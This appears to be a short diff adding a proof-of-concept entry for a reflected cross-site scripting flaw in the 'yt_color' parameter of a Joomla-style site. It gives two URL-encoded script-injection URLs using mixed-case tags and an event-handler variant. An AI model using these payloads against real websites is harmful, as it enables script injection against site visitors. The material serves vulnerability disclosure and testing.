@@ -1,0 +1,3 @@
+http://www.example.com/index.php/inicio?yt_color=%3E%22%3E%3CScRiPt%20%0a%0d%3Ealert(12346)%3B%3C/ScRiPt%3E
+http://www.example.com/index.php?option=com_content&amp;task=view&amp;id=13&amp;Itemid=47&amp;yt_color=%00&#039;%22%3E%3CScRiPt%20%0a%0d%3Ealert(123456)%3B%3C/ScRiPt%3E
+The GET variable yt_color can be set to &quot;+onmouseover=alert(123456)+
